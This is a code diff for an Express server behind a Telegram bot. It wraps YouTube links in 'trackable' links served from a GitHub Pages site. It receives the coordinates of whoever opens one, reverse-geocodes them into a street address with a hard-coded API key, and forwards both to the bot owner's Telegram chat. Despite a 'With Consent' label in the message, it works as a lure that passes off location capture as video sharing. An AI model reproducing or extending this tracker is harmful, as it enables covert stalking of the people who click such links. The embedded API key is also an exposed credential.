@@ -1,23 +1,23 @@
 const express = require('express');
 const axios = require('axios');
-const cors = require('cors'); // CORS error se bachne ke liye
+const cors = require('cors'); 
 const app = express();
 
 app.use(cors());
 app.use(express.json());
 
-// ⚠️ APNA GITHUB PAGES KA URL YAHAN DAALEIN (Bina last slash '/' ke)
-const GITHUB_PAGES_URL = 'https://your-username.github.io/your-repo-name';
+// Aapka sahi GitHub Pages URL setup ho gaya hai
+const GITHUB_PAGES_URL = 'https://saiq123341-create.github.io/-video-share-bot';
 
-// Dashboard se environment variables uthane ke liye
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const GEOCODE_API_KEY = process.env.GEOCODE_API_KEY || '6a5bb6dec8d47064344344ezpa215ba';
 
-// 1. Telegram bot se URL receive karke trackable link banana
+// 1. Bot se URL lekar trackable URL banana
 app.post('/bot/generate-link', (req, res) => {
     const { chat_id, youtube_url } = req.body;
     
-    const videoIdMatch = youtube_url.match(/(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([^& \n]+)/);
+    // Shorts aur single video link fix ke sath regex
+    const videoIdMatch = youtube_url.match(/(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/shorts\/)([^?& \n]+)/);
     const videoId = videoIdMatch ? videoIdMatch[1] : '';
 
     if (!videoId) {
@@ -28,7 +28,7 @@ app.post('/bot/generate-link', (req, res) => {
     res.json({ tracking_link: trackingLink });
 });
 
-// 2. Frontend se location lekar address nikalna aur Bot par bhejna
+// 2. Location data lekar bot par message trigger karna
 app.post('/api/report-location', async (req, res) => {
     const { chat_id, lat, lon } = req.body;
 
@@ -37,12 +37,10 @@ app.post('/api/report-location', async (req, res) => {
     }
 
     try {
-        // Reverse Geocoding API call
         const geocodeUrl = `https://geocode.maps.co/reverse?lat=${lat}&lon=${lon}&api_key=${GEOCODE_API_KEY}`;
         const geoResponse = await axios.get(geocodeUrl);
         const addressData = geoResponse.data.display_name || "Location found but address unavailable";
 
-        // Telegram Bot par result bhejna
         const telegramMessage = `📍 *New Location Received (With Consent)*\n\n` +
                                 `• *Coordinates:* \`${lat}, ${lon}\`\n` +
                                 `• *Address:* ${addressData}`;
